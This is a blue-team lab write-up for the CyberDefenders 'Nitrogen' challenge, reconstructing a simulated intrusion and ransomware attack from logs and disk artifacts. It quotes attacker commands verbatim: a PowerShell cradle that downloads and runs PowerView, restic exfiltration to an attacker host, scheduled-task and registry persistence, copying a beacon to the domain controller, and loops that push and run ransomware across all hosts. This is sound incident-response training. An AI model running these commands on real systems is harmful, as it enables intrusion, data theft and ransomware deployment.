# Nitrogen

CCD Lab Link: [Nitrogen | Blue team challenge.](https://cyberdefenders.org/blueteam-ctf-challenges/nitrogen/)

# Table of Contents
- [Scenario](#scenario)
- [Initial Access](#initial-access)
- [Execution](#execution)
- [Command and Control](#command-and-control)
- [Persistence](#persistence)
- [Reconnaissance](#reconnaissance)
- [Credential Access](#credential-access)
- [Lateral Movement](#lateral-movement)
- [Exfiltration](#exfiltration)
- [Impact](#impact)

# Scenario

On September 10, 2025, trustwave.lab’s SOC team identified suspicious activity originating from a user workstation. The investigation revealed that the compromise began when the user searched online for legitimate software and clicked on an advertised website appearing in the first search results. Unbeknownst to the user, this site hosted a malicious download, which they executed with a single click, initiating a chain of malicious activity across the environment.

Subsequent events included staged payloads, beaconing to command-and-control (C2) infrastructure, lateral movement to the file server and domain controller, credential dumping, and attempts at data exfiltration.

Your task is to perform a full incident investigation using Splunk telemetry, process creation logs, registry artifacts, scheduled task information, network connections, and forensic disk images to reconstruct the attacker’s actions, identify persistence mechanisms, and determine the impact on trustwave.lab’s network.

# Initial Access

1. User james searched for *advanced ip scanner download* using Edge on endpoint PC01.
2. User james then visited this website: `pcrendal[.]com`, to download above software, using Edge
3. User james downloaded above software to: `C:\\Users\\james\\Downloads\\Version.zip`, using MS Edge

# Execution

1. User james unzipped Version.zip, then executed install.exe, which attempted to load DLL python311.dll
2. Malicious binary `install.exe` then creates a new script and runs it here as a second-stage component: `C:\\Users\\james\\AppData\\Roaming\\Notepad\\slv.py`.
3. Above python script invoked **Cryptodome** library to decrypt the file `C:\\Users\\james\\AppData\\Roaming\\Notepad\\data.aes` into `data.dll`. Discovered using `$MFT` file remnants with `MFTECmd`.
4. On the FILES host attacker downloaded the zipped file `c:\\Windows\\ADFS\\py\\python.zip`. This wasn't detected in browser logs so it must have been done via other means like local file transfer. Done using `curl`.
5. Attacker then extracted these files from the `python.zip` archive in the same staging directory, also detected using `MFTECmd` : `worksliv.exe`,`wof15.exe`, and `wmisock.exe`.

# Command and Control

1. Shortly after the staged script ran, the host PC01 made an outbound connection to the attacker’s C2. The destination IP address and port used for that first C2 communication is `10.10.5.219:1337`. The process that originated the outbound C2 request is `C:\\Windows\\System32\\rundll32.exe`.
2. After the initial C2 connection, the attacker deployed additional beacons. The ports used by the newly executed files to connect to the attacker’s server are `8844` and `8855`.
3. After deploying additional beacons on the FILES server, the attacker communicated with a secondary infrastructure. The domain name of the second C2 server used during the attack is `docusong[.]com`. The process that performed the DNS query was `C:\\Windows\\adfs\\py\\worksliv.exe`.
4. The attacker moved a beacon from the FILES server to the Domain Controller. The command used to copy the file across the network was `xcopy wmisock.exe \\DC01.trustwave.lab\\c$\\Windows\\ADFS\\py\\ /E /H /D /Y /I`.
5. After executing the beacon on the Domain Controller in Q12, the following IP address and port were used for C2 communication: `10.10.5.174:8080`. The process invoking this communication is `c:\\Windows\\ADFS\\py\\wmisock.exe`.

# Persistence

1. On PC01, the attacker created scheduled tasks for persistence. The name of the first scheduled task created on this host is `OneDrive Security Task-S-1-5-20-Main`, as found in the Sysmon event `schtasks /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-20-Main" /tr C:UsersjamesAppdataLocalProgramsupedge.bat /SC ONSTART /F`.
2. On the FILES server, the attacker also used scheduled tasks for persistence. The attacker’s final scheduled task will be executed 2 times a day (every 720 minutes), as evident by the full command: `schtasks /create /ru SYSTEM /tn ""OneDrive Security Task-S-1-5-23-Main"" /tr C:UsersPublicupedge.bat /sc MINUTE /mo 720 /F`.
3. On the FILES server, the attacker also modified the registry to maintain persistence running a batch file. The target key is `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\UserInit` and the target value is `"c:\\Windows\\system32\\userinit.exe, C:\\Users\\Public\\upedge.bat"`. This was done using the standard Windows binary `C:\\Windows\\system32\\reg.exe`.

# Reconnaissance

1. Back on PC01, during the reconnaissance phase, the attacker enumerated domain trust relationships using this LOLBAS command: `nltest /domain_trusts /all_trusts`.
2. Again on PC01, the attacker leveraged PowerView for automated enumeration, downloaded using PowerShell: `powershell "IEX (New-Object Net.Webclient).DownloadString('<http://10.10.5.218:54350/PowerView.ps1>'); Get-DomainComputer -OperatingSystem '*server*' -Properties 'name,operatingsystem,operatingsystemversion,lastlogontimestamp,dnshostname' -Ping &gt;&gt; srv.txt"`. **Risk**: The attacker is building a prioritized target list of live, vulnerable servers. They now know which servers to attack next for lateral movement or data exfiltration based on OS versions and activity levels.

# Credential Access

1. On PC01, at the timestamp `2025-09-10 10:47:03`, the attacker managed to dump the hashes. Attacker targeted the credential store `C:\\Windows\\system32\\lsass.exe` using source image `C:\\Windows\\System32\\spoolsv.exe` after being granted access to memory with code `0x1010`. Call trace: `C:\\Windows\\SYSTEM32\\ntdll.dll+9d9b4|C:\\Windows\\System32\\KERNELBASE.dll+3313e|UNKNOWN(00000001800BD3D8)`.
2. The attacker attempted to dump credentials from LSASS on the FILES server. `GrantedAccess` code issued when the attacker accessed `lsass.exe` was `0x1FFFFF`, indicating `PROCESS_ALL_ACCESS` permission mask. **Risk**: This means the requesting process has been granted all possible access rights to the target process.

# Lateral Movement

1. The attacker laterally moved to the FILES server. The username they used to log in during this movement was `liam`.
2. The attacker logged into the Domain Controller DC01 using RDP. The source IP address they connected from was `10.10.5.96`. This was easily discovered using the MITRE rule `technique_id=T1021,technique_name=Remote Services` and port `3389` on DC01.

# Exfiltration

1. The attacker used a command-line utility to push collected files off-network from the FILES server. Command line used: `C:\\Users\\Public\\restic.exe -r rest:<http://pcrendal.com:8080/> --use-fs-snapshot --verbose backup C:\\Shares\\backup --password-file ppp.txt`.

# Impact

1. On DC01, the attacker modified Safe Mode settings so a service would be allowed to start when the system boots into Safe Mode with Networking, adding a unique subkey using this command: `reg add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Network\\\\FAKE123456789 /d Service /f`.
2. From DC01, The attacker attempted to push a ransomware binary to every machine in the environment. using this command: `cmd.exe /C "for /f %%a in (pc.txt) do copy C:\\\\ProgramData\\\\wavcomp.exe /y \\\\\\\\%%a\\\\c$\\\\wavcomp.exe"`
3. From DC01, The attacker executed a single command to run a script remotely on every host listed in their target file using this command: `PsExec64.exe -accepteula @pc.txt -c -f -d -h c:\\Users\\Administrator\\AppData\\5.bat`. **Risk**: For both these steps, the first command (`cmd.exe`) loops and copies the ransomware binary to all live hosts, then the `5.bat` file is used to invoke it by copying it to the same set of machines and executing it.
4. Finally, the attacker dropped a ransom note on DC01. The note instructed the victim to visit the darknet website: `https[:]//protonmailrmez3lotccipshtkleegetolb73fuirgj7r4o4vfu7ozyd[.]onion//?access-key=!15982tge32`.
